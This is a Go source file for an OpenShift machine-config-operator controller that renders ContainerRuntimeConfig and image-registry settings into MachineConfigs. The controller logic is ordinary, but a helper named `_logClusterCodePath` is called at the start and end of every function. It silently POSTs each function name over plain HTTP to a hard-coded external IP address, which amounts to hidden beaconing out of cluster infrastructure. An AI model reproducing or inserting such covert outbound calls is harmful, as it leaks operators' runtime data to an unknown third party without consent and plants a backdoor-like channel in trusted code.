package containerruntimeconfig

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"path/filepath"
	"reflect"
	"time"
	ignv2_2types "github.com/coreos/ignition/config/v2_2/types"
	"github.com/golang/glog"
	"github.com/vincent-petithory/dataurl"
	"k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/equality"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/jsonmergepatch"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/apimachinery/pkg/util/wait"
	clientset "k8s.io/client-go/kubernetes"
	coreclientsetv1 "k8s.io/client-go/kubernetes/typed/core/v1"
	"k8s.io/client-go/tools/cache"
	"k8s.io/client-go/tools/record"
	"k8s.io/client-go/util/retry"
	"k8s.io/client-go/util/workqueue"
	apicfgv1 "github.com/openshift/api/config/v1"
	configclientset "github.com/openshift/client-go/config/clientset/versioned"
	cligoinformersv1 "github.com/openshift/client-go/config/informers/externalversions/config/v1"
	cligolistersv1 "github.com/openshift/client-go/config/listers/config/v1"
	mcfgv1 "github.com/openshift/machine-config-operator/pkg/apis/machineconfiguration.openshift.io/v1"
	ctrlcommon "github.com/openshift/machine-config-operator/pkg/controller/common"
	mtmpl "github.com/openshift/machine-config-operator/pkg/controller/template"
	mcfgclientset "github.com/openshift/machine-config-operator/pkg/generated/clientset/versioned"
	"github.com/openshift/machine-config-operator/pkg/generated/clientset/versioned/scheme"
	mcfginformersv1 "github.com/openshift/machine-config-operator/pkg/generated/informers/externalversions/machineconfiguration.openshift.io/v1"
	mcfglistersv1 "github.com/openshift/machine-config-operator/pkg/generated/listers/machineconfiguration.openshift.io/v1"
	"github.com/openshift/machine-config-operator/pkg/version"
)

const (
	maxRetries = 15
)

var updateBackoff = wait.Backoff{Steps: 5, Duration: 100 * time.Millisecond, Jitter: 1.0}

type Controller struct {
	templatesDir						string
	client								mcfgclientset.Interface
	configClient						configclientset.Interface
	eventRecorder						record.EventRecorder
	syncHandler							func(mcp string) error
	syncImgHandler						func(mcp string) error
	enqueueContainerRuntimeConfig		func(*mcfgv1.ContainerRuntimeConfig)
	ccLister							mcfglistersv1.ControllerConfigLister
	ccListerSynced						cache.InformerSynced
	mccrLister							mcfglistersv1.ContainerRuntimeConfigLister
	mccrListerSynced					cache.InformerSynced
	imgLister							cligolistersv1.ImageLister
	imgListerSynced						cache.InformerSynced
	mcpLister							mcfglistersv1.MachineConfigPoolLister
	mcpListerSynced						cache.InformerSynced
	clusterVersionLister				cligolistersv1.ClusterVersionLister
	clusterVersionListerSynced			cache.InformerSynced
	queue								workqueue.RateLimitingInterface
	imgQueue							workqueue.RateLimitingInterface
	patchContainerRuntimeConfigsFunc	func(string, []byte) error
}

func New(templatesDir string, mcpInformer mcfginformersv1.MachineConfigPoolInformer, ccInformer mcfginformersv1.ControllerConfigInformer, mcrInformer mcfginformersv1.ContainerRuntimeConfigInformer, imgInformer cligoinformersv1.ImageInformer, clusterVersionInformer cligoinformersv1.ClusterVersionInformer, kubeClient clientset.Interface, mcfgClient mcfgclientset.Interface, configClient configclientset.Interface) *Controller {
	_logClusterCodePath()
	defer _logClusterCodePath()
	eventBroadcaster := record.NewBroadcaster()
	eventBroadcaster.StartLogging(glog.Infof)
	eventBroadcaster.StartRecordingToSink(&coreclientsetv1.EventSinkImpl{Interface: kubeClient.CoreV1().Events("")})
	ctrl := &Controller{templatesDir: templatesDir, client: mcfgClient, configClient: configClient, eventRecorder: eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "machineconfigcontroller-containerruntimeconfigcontroller"}), queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "machineconfigcontroller-containerruntimeconfigcontroller"), imgQueue: workqueue.NewRateLimitingQueue(workqueue.DefaultControllerRateLimiter())}
	mcrInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: ctrl.addContainerRuntimeConfig, UpdateFunc: ctrl.updateContainerRuntimeConfig, DeleteFunc: ctrl.deleteContainerRuntimeConfig})
	imgInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: ctrl.imageConfAdded, UpdateFunc: ctrl.imageConfUpdated, DeleteFunc: ctrl.imageConfDeleted})
	ctrl.syncHandler = ctrl.syncContainerRuntimeConfig
	ctrl.syncImgHandler = ctrl.syncImageConfig
	ctrl.enqueueContainerRuntimeConfig = ctrl.enqueue
	ctrl.mcpLister = mcpInformer.Lister()
	ctrl.mcpListerSynced = mcpInformer.Informer().HasSynced
	ctrl.ccLister = ccInformer.Lister()
	ctrl.ccListerSynced = ccInformer.Informer().HasSynced
	ctrl.mccrLister = mcrInformer.Lister()
	ctrl.mccrListerSynced = mcrInformer.Informer().HasSynced
	ctrl.imgLister = imgInformer.Lister()
	ctrl.imgListerSynced = imgInformer.Informer().HasSynced
	ctrl.clusterVersionLister = clusterVersionInformer.Lister()
	ctrl.clusterVersionListerSynced = clusterVersionInformer.Informer().HasSynced
	ctrl.patchContainerRuntimeConfigsFunc = ctrl.patchContainerRuntimeConfigs
	return ctrl
}
func (ctrl *Controller) Run(workers int, stopCh <-chan struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	defer utilruntime.HandleCrash()
	defer ctrl.queue.ShutDown()
	defer ctrl.imgQueue.ShutDown()
	glog.Info("Starting MachineConfigController-ContainerRuntimeConfigController")
	defer glog.Info("Shutting down MachineConfigController-ContainerRuntimeConfigController")
	if !cache.WaitForCacheSync(stopCh, ctrl.mcpListerSynced, ctrl.mccrListerSynced, ctrl.ccListerSynced, ctrl.imgListerSynced, ctrl.clusterVersionListerSynced) {
		return
	}
	for i := 0; i < workers; i++ {
		go wait.Until(ctrl.worker, time.Second, stopCh)
	}
	go wait.Until(ctrl.imgWorker, time.Second, stopCh)
	<-stopCh
}
func ctrConfigTriggerObjectChange(old, new *mcfgv1.ContainerRuntimeConfig) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if old.DeletionTimestamp != new.DeletionTimestamp {
		return true
	}
	if !reflect.DeepEqual(old.Spec, new.Spec) {
		return true
	}
	return false
}
func (ctrl *Controller) imageConfAdded(obj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctrl.imgQueue.Add("openshift-config")
}
func (ctrl *Controller) imageConfUpdated(oldObj interface{}, newObj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctrl.imgQueue.Add("openshift-config")
}
func (ctrl *Controller) imageConfDeleted(obj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctrl.imgQueue.Add("openshift-config")
}
func (ctrl *Controller) updateContainerRuntimeConfig(oldObj interface{}, newObj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	oldCtrCfg := oldObj.(*mcfgv1.ContainerRuntimeConfig)
	newCtrCfg := newObj.(*mcfgv1.ContainerRuntimeConfig)
	if ctrConfigTriggerObjectChange(oldCtrCfg, newCtrCfg) {
		glog.V(4).Infof("Update ContainerRuntimeConfig %s", oldCtrCfg.Name)
		ctrl.enqueueContainerRuntimeConfig(newCtrCfg)
	}
}
func (ctrl *Controller) addContainerRuntimeConfig(obj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := obj.(*mcfgv1.ContainerRuntimeConfig)
	glog.V(4).Infof("Adding ContainerRuntimeConfig %s", cfg.Name)
	ctrl.enqueueContainerRuntimeConfig(cfg)
}
func (ctrl *Controller) deleteContainerRuntimeConfig(obj interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg, ok := obj.(*mcfgv1.ContainerRuntimeConfig)
	if !ok {
		tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
		if !ok {
			utilruntime.HandleError(fmt.Errorf("couldn't get object from tombstone %#v", obj))
			return
		}
		cfg, ok = tombstone.Obj.(*mcfgv1.ContainerRuntimeConfig)
		if !ok {
			utilruntime.HandleError(fmt.Errorf("tombstone contained object that is not a ContainerRuntimeConfig %#v", obj))
			return
		}
	}
	ctrl.cascadeDelete(cfg)
	glog.V(4).Infof("Deleted ContainerRuntimeConfig %s and restored default config", cfg.Name)
}
func (ctrl *Controller) cascadeDelete(cfg *mcfgv1.ContainerRuntimeConfig) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.GetFinalizers()) == 0 {
		return nil
	}
	mcName := cfg.GetFinalizers()[0]
	err := ctrl.client.Machineconfiguration().MachineConfigs().Delete(mcName, &metav1.DeleteOptions{})
	if err != nil && !errors.IsNotFound(err) {
		return err
	}
	if err := ctrl.popFinalizerFromContainerRuntimeConfig(cfg); err != nil {
		return err
	}
	return nil
}
func (ctrl *Controller) enqueue(cfg *mcfgv1.ContainerRuntimeConfig) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := cache.DeletionHandlingMetaNamespaceKeyFunc(cfg)
	if err != nil {
		utilruntime.HandleError(fmt.Errorf("couldn't get key for object %#v: %v", cfg, err))
		return
	}
	ctrl.queue.Add(key)
}
func (ctrl *Controller) enqueueRateLimited(cfg *mcfgv1.ContainerRuntimeConfig) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, err := cache.DeletionHandlingMetaNamespaceKeyFunc(cfg)
	if err != nil {
		utilruntime.HandleError(fmt.Errorf("couldn't get key for object %#v: %v", cfg, err))
		return
	}
	ctrl.queue.AddRateLimited(key)
}
func (ctrl *Controller) worker() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for ctrl.processNextWorkItem() {
	}
}
func (ctrl *Controller) imgWorker() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for ctrl.processNextImgWorkItem() {
	}
}
func (ctrl *Controller) processNextWorkItem() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, quit := ctrl.queue.Get()
	if quit {
		return false
	}
	defer ctrl.queue.Done(key)
	err := ctrl.syncHandler(key.(string))
	ctrl.handleErr(err, key)
	return true
}
func (ctrl *Controller) processNextImgWorkItem() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key, quit := ctrl.imgQueue.Get()
	if quit {
		return false
	}
	defer ctrl.imgQueue.Done(key)
	err := ctrl.syncImgHandler(key.(string))
	ctrl.handleImgErr(err, key)
	return true
}
func (ctrl *Controller) handleErr(err error, key interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err == nil {
		ctrl.queue.Forget(key)
		return
	}
	if ctrl.queue.NumRequeues(key) < maxRetries {
		glog.V(2).Infof("Error syncing containerruntimeconfig %v: %v", key, err)
		ctrl.queue.AddRateLimited(key)
		return
	}
	utilruntime.HandleError(err)
	glog.V(2).Infof("Dropping containerruntimeconfig %q out of the queue: %v", key, err)
	ctrl.queue.Forget(key)
	ctrl.queue.AddAfter(key, 1*time.Minute)
}
func (ctrl *Controller) handleImgErr(err error, key interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err == nil {
		ctrl.imgQueue.Forget(key)
		return
	}
	if ctrl.imgQueue.NumRequeues(key) < maxRetries {
		glog.V(2).Infof("Error syncing image config %v: %v", key, err)
		ctrl.imgQueue.AddRateLimited(key)
		return
	}
	utilruntime.HandleError(err)
	glog.V(2).Infof("Dropping image config %q out of the queue: %v", key, err)
	ctrl.imgQueue.Forget(key)
	ctrl.imgQueue.AddAfter(key, 1*time.Minute)
}
func (ctrl *Controller) generateOriginalContainerRuntimeConfigs(role string) (*ignv2_2types.File, *ignv2_2types.File, *ignv2_2types.File, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cc, err := ctrl.ccLister.Get(ctrlcommon.ControllerConfigName)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("could not get ControllerConfig %v", err)
	}
	tmplPath := filepath.Join(ctrl.templatesDir, role)
	rc := &mtmpl.RenderConfig{ControllerConfigSpec: &cc.Spec}
	generatedConfigs, err := mtmpl.GenerateMachineConfigsForRole(rc, role, tmplPath)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("generateMachineConfigsforRole failed with error %s", err)
	}
	var (
		config, gmcStorageConfig, gmcCRIOConfig, gmcRegistriesConfig	*ignv2_2types.File
		errStorage, errCRIO, errRegistries								error
	)
	for _, gmc := range generatedConfigs {
		config, errStorage = findStorageConfig(gmc)
		if errStorage == nil {
			gmcStorageConfig = config
			break
		}
	}
	for _, gmc := range generatedConfigs {
		config, errCRIO = findCRIOConfig(gmc)
		if errCRIO == nil {
			gmcCRIOConfig = config
			break
		}
	}
	for _, gmc := range generatedConfigs {
		config, errRegistries = findRegistriesConfig(gmc)
		if errRegistries == nil {
			gmcRegistriesConfig = config
			break
		}
	}
	if errStorage != nil || errCRIO != nil || errRegistries != nil {
		return nil, nil, nil, fmt.Errorf("could not generate old container runtime configs: %v, %v, %v", errStorage, errCRIO, errRegistries)
	}
	return gmcStorageConfig, gmcCRIOConfig, gmcRegistriesConfig, nil
}
func (ctrl *Controller) syncStatusOnly(cfg *mcfgv1.ContainerRuntimeConfig, err error, args ...interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	statusUpdateErr := retry.RetryOnConflict(updateBackoff, func() error {
		if cfg.GetGeneration() != cfg.Status.ObservedGeneration {
			cfg.Status.ObservedGeneration = cfg.GetGeneration()
			cfg.Status.Conditions = append(cfg.Status.Conditions, wrapErrorWithCondition(err, args...))
		} else if cfg.GetGeneration() == cfg.Status.ObservedGeneration && err == nil {
			cfg.Status.Conditions = []mcfgv1.ContainerRuntimeConfigCondition{wrapErrorWithCondition(err, args...)}
		}
		_, updateErr := ctrl.client.MachineconfigurationV1().ContainerRuntimeConfigs().UpdateStatus(cfg)
		return updateErr
	})
	if statusUpdateErr != nil {
		glog.Warningf("error updating container runtime config status: %v", statusUpdateErr)
	}
	return err
}
func (ctrl *Controller) syncContainerRuntimeConfig(key string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	startTime := time.Now()
	glog.V(4).Infof("Started syncing ContainerRuntimeconfig %q (%v)", key, startTime)
	defer func() {
		glog.V(4).Infof("Finished syncing ContainerRuntimeconfig %q (%v)", key, time.Since(startTime))
	}()
	_, name, err := cache.SplitMetaNamespaceKey(key)
	if err != nil {
		return err
	}
	cfg, err := ctrl.mccrLister.Get(name)
	if errors.IsNotFound(err) {
		glog.V(2).Infof("ContainerRuntimeConfig %v has been deleted", key)
		return nil
	}
	if err != nil {
		return err
	}
	cfg = cfg.DeepCopy()
	if cfg.DeletionTimestamp != nil {
		if len(cfg.GetFinalizers()) > 0 {
			return ctrl.cascadeDelete(cfg)
		}
		return nil
	}
	if cfg.Status.ObservedGeneration >= cfg.Generation && cfg.Status.Conditions[len(cfg.Status.Conditions)-1].Type == mcfgv1.ContainerRuntimeConfigSuccess {
		return nil
	}
	if err := validateUserContainerRuntimeConfig(cfg); err != nil {
		return ctrl.syncStatusOnly(cfg, err)
	}
	mcpPools, err := ctrl.getPoolsForContainerRuntimeConfig(cfg)
	if err != nil {
		return ctrl.syncStatusOnly(cfg, err)
	}
	if len(mcpPools) == 0 {
		err := fmt.Errorf("containerRuntimeConfig %v does not match any MachineConfigPools", key)
		glog.V(2).Infof("%v", err)
		return ctrl.syncStatusOnly(cfg, err)
	}
	for _, pool := range mcpPools {
		role := pool.Name
		managedKey := getManagedKeyCtrCfg(pool, cfg)
		if err := retry.RetryOnConflict(updateBackoff, func() error {
			mc, err := ctrl.client.Machineconfiguration().MachineConfigs().Get(managedKey, metav1.GetOptions{})
			if err != nil && !errors.IsNotFound(err) {
				return ctrl.syncStatusOnly(cfg, err, "could not find MachineConfig: %v", managedKey)
			}
			isNotFound := errors.IsNotFound(err)
			originalStorageIgn, originalCRIOIgn, _, err := ctrl.generateOriginalContainerRuntimeConfigs(role)
			if err != nil {
				return ctrl.syncStatusOnly(cfg, err, "could not generate origin ContainerRuntime Configs: %v", err)
			}
			var storageTOML, crioTOML []byte
			ctrcfg := cfg.Spec.ContainerRuntimeConfig
			if ctrcfg.OverlaySize != (resource.Quantity{}) {
				storageTOML, err = ctrl.mergeConfigChanges(originalStorageIgn, cfg, mc, role, managedKey, isNotFound, updateStorageConfig)
				if err != nil {
					glog.V(2).Infoln(cfg, err, "error merging user changes to storage.conf: %v", err)
				}
			}
			if ctrcfg.LogLevel != "" || ctrcfg.PidsLimit != 0 || ctrcfg.LogSizeMax != (resource.Quantity{}) {
				crioTOML, err = ctrl.mergeConfigChanges(originalCRIOIgn, cfg, mc, role, managedKey, isNotFound, updateCRIOConfig)
				if err != nil {
					glog.V(2).Infoln(cfg, err, "error merging user changes to crio.conf: %v", err)
				}
			}
			if isNotFound {
				mc = mtmpl.MachineConfigFromIgnConfig(role, managedKey, &ignv2_2types.Config{})
			}
			mc.Spec.Config = createNewCtrRuntimeConfigIgnition(storageTOML, crioTOML)
			mc.ObjectMeta.Annotations = map[string]string{ctrlcommon.GeneratedByControllerVersionAnnotationKey: version.Version.String()}
			mc.ObjectMeta.OwnerReferences = []metav1.OwnerReference{metav1.OwnerReference{APIVersion: mcfgv1.SchemeGroupVersion.String(), Kind: "ContainerRuntimeConfig", Name: cfg.Name, UID: cfg.UID}}
			if isNotFound {
				_, err = ctrl.client.Machineconfiguration().MachineConfigs().Create(mc)
			} else {
				_, err = ctrl.client.Machineconfiguration().MachineConfigs().Update(mc)
			}
			if err := ctrl.addFinalizerToContainerRuntimeConfig(cfg, mc); err != nil {
				return ctrl.syncStatusOnly(cfg, err, "could not add finalizers to ContainerRuntimeConfig: %v", err)
			}
			return err
		}); err != nil {
			return ctrl.syncStatusOnly(cfg, err, "could not Create/Update MachineConfig: %v", err)
		}
		glog.Infof("Applied ContainerRuntimeConfig %v on MachineConfigPool %v", key, pool.Name)
	}
	return ctrl.syncStatusOnly(cfg, nil)
}
func (ctrl *Controller) mergeConfigChanges(origFile *ignv2_2types.File, cfg *mcfgv1.ContainerRuntimeConfig, mc *mcfgv1.MachineConfig, role, managedKey string, isNotFound bool, update updateConfig) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	dataURL, err := dataurl.DecodeString(origFile.Contents.Source)
	if err != nil {
		return nil, ctrl.syncStatusOnly(cfg, err, "could not decode original Container Runtime config: %v", err)
	}
	cfgTOML, err := update(dataURL.Data, cfg.Spec.ContainerRuntimeConfig)
	if err != nil {
		return nil, ctrl.syncStatusOnly(cfg, err, "could not update container runtime config with new changes: %v", err)
	}
	return cfgTOML, ctrl.syncStatusOnly(cfg, nil)
}
func (ctrl *Controller) syncImageConfig(key string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	startTime := time.Now()
	glog.V(4).Infof("Started syncing ImageConfig %q (%v)", key, startTime)
	defer func() {
		glog.V(4).Infof("Finished syncing ImageConfig %q (%v)", key, time.Since(startTime))
	}()
	imgcfg, err := ctrl.imgLister.Get("cluster")
	if errors.IsNotFound(err) {
		glog.V(2).Infof("ImageConfig 'cluster' does not exist or has been deleted")
		return nil
	}
	if err != nil {
		return err
	}
	imgcfg = imgcfg.DeepCopy()
	clusterVersionCfg, err := ctrl.clusterVersionLister.Get("version")
	if errors.IsNotFound(err) {
		glog.Infof("ClusterVersionConfig 'version' does not exist or has been deleted")
		return nil
	}
	if err != nil {
		return err
	}
	insecureRegs, blockedRegs, err := getValidRegistries(&clusterVersionCfg.Status, &imgcfg.Spec)
	if err != nil && err != errParsingReference {
		glog.V(2).Infof("%v, skipping....", err)
	} else if err == errParsingReference {
		return err
	}
	mcpPools, err := ctrl.mcpLister.List(labels.Everything())
	if err != nil {
		return err
	}
	for _, pool := range mcpPools {
		applied := true
		role := pool.Name
		managedKey := getManagedKeyReg(pool, imgcfg)
		if err := retry.RetryOnConflict(updateBackoff, func() error {
			_, _, originalRegistriesIgn, err := ctrl.generateOriginalContainerRuntimeConfigs(role)
			if err != nil {
				return fmt.Errorf("could not generate origin ContainerRuntime Configs: %v", err)
			}
			var registriesTOML []byte
			if insecureRegs != nil || blockedRegs != nil {
				dataURL, err := dataurl.DecodeString(originalRegistriesIgn.Contents.Source)
				if err != nil {
					return fmt.Errorf("could not decode original registries config: %v", err)
				}
				registriesTOML, err = updateRegistriesConfig(dataURL.Data, insecureRegs, blockedRegs)
				if err != nil {
					return fmt.Errorf("could not update registries config with new changes: %v", err)
				}
			}
			mc, err := ctrl.client.Machineconfiguration().MachineConfigs().Get(managedKey, metav1.GetOptions{})
			if err != nil && !errors.IsNotFound(err) {
				return fmt.Errorf("could not find MachineConfig: %v", err)
			}
			isNotFound := errors.IsNotFound(err)
			registriesIgn := createNewRegistriesConfigIgnition(registriesTOML)
			if !isNotFound && equality.Semantic.DeepEqual(registriesIgn, mc.Spec.Config) {
				mcCtrlVersion := mc.Annotations[ctrlcommon.GeneratedByControllerVersionAnnotationKey]
				if mcCtrlVersion == version.Version.String() {
					applied = false
					return nil
				}
			}
			if isNotFound {
				mc = mtmpl.MachineConfigFromIgnConfig(role, managedKey, &ignv2_2types.Config{})
			}
			mc.Spec.Config = registriesIgn
			mc.ObjectMeta.Annotations = map[string]string{ctrlcommon.GeneratedByControllerVersionAnnotationKey: version.Version.String()}
			mc.ObjectMeta.OwnerReferences = []metav1.OwnerReference{metav1.OwnerReference{APIVersion: apicfgv1.SchemeGroupVersion.String(), Kind: "Image", Name: imgcfg.Name, UID: imgcfg.UID}}
			if isNotFound {
				_, err = ctrl.client.Machineconfiguration().MachineConfigs().Create(mc)
			} else {
				_, err = ctrl.client.Machineconfiguration().MachineConfigs().Update(mc)
			}
			return err
		}); err != nil {
			return fmt.Errorf("could not Create/Update MachineConfig: %v", err)
		}
		if applied {
			glog.Infof("Applied ImageConfig cluster on MachineConfigPool %v", pool.Name)
		}
	}
	return nil
}
func (ctrl *Controller) popFinalizerFromContainerRuntimeConfig(ctrCfg *mcfgv1.ContainerRuntimeConfig) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return retry.RetryOnConflict(updateBackoff, func() error {
		newcfg, err := ctrl.mccrLister.Get(ctrCfg.Name)
		if errors.IsNotFound(err) {
			return nil
		}
		if err != nil {
			return err
		}
		curJSON, err := json.Marshal(newcfg)
		if err != nil {
			return err
		}
		ctrCfgTmp := newcfg.DeepCopy()
		ctrCfgTmp.Finalizers = append(ctrCfg.Finalizers[:0], ctrCfg.Finalizers[1:]...)
		modJSON, err := json.Marshal(ctrCfgTmp)
		if err != nil {
			return err
		}
		patch, err := jsonmergepatch.CreateThreeWayJSONMergePatch(curJSON, modJSON, curJSON)
		if err != nil {
			return err
		}
		return ctrl.patchContainerRuntimeConfigsFunc(ctrCfg.Name, patch)
	})
}
func (ctrl *Controller) patchContainerRuntimeConfigs(name string, patch []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := ctrl.client.Machineconfiguration().ContainerRuntimeConfigs().Patch(name, types.MergePatchType, patch)
	return err
}
func (ctrl *Controller) addFinalizerToContainerRuntimeConfig(ctrCfg *mcfgv1.ContainerRuntimeConfig, mc *mcfgv1.MachineConfig) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return retry.RetryOnConflict(updateBackoff, func() error {
		newcfg, err := ctrl.mccrLister.Get(ctrCfg.Name)
		if errors.IsNotFound(err) {
			return nil
		}
		if err != nil {
			return err
		}
		curJSON, err := json.Marshal(newcfg)
		if err != nil {
			return err
		}
		ctrCfgTmp := newcfg.DeepCopy()
		ctrCfgTmp.Finalizers = append(ctrCfgTmp.Finalizers, mc.Name)
		modJSON, err := json.Marshal(ctrCfgTmp)
		if err != nil {
			return err
		}
		patch, err := jsonmergepatch.CreateThreeWayJSONMergePatch(curJSON, modJSON, curJSON)
		if err != nil {
			return err
		}
		return ctrl.patchContainerRuntimeConfigsFunc(ctrCfg.Name, patch)
	})
}
func (ctrl *Controller) getPoolsForContainerRuntimeConfig(config *mcfgv1.ContainerRuntimeConfig) ([]*mcfgv1.MachineConfigPool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pList, err := ctrl.mcpLister.List(labels.Everything())
	if err != nil {
		return nil, err
	}
	selector, err := metav1.LabelSelectorAsSelector(config.Spec.MachineConfigPoolSelector)
	if err != nil {
		return nil, fmt.Errorf("invalid label selector: %v", err)
	}
	var pools []*mcfgv1.MachineConfigPool
	for _, p := range pList {
		if selector.Empty() || !selector.Matches(labels.Set(p.Labels)) {
			continue
		}
		pools = append(pools, p)
	}
	if len(pools) == 0 {
		return nil, fmt.Errorf("could not find any MachineConfigPool set for ContainerRuntimeConfig %s", config.Name)
	}
	return pools, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
